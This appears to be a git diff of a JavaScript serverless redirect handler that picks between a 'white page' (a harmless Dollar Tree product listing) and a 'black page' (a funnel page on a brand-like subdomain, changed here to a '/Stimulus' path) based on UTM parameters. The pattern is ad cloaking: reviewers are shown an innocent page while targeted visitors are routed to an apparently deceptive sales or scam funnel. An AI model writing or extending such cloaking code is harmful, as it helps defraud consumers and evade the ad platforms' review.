@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.dollartree.com/doll-house-with-furniture-and-people-5875x475x2125-in/327527";
-    const blackPageURL = "https://gymboreeusk.myfunnelish.com/target-1735686017557538232";
+    const blackPageURL = "https://gymboreeusk.myfunnelish.com/Stimulus";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,5 +25,6 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
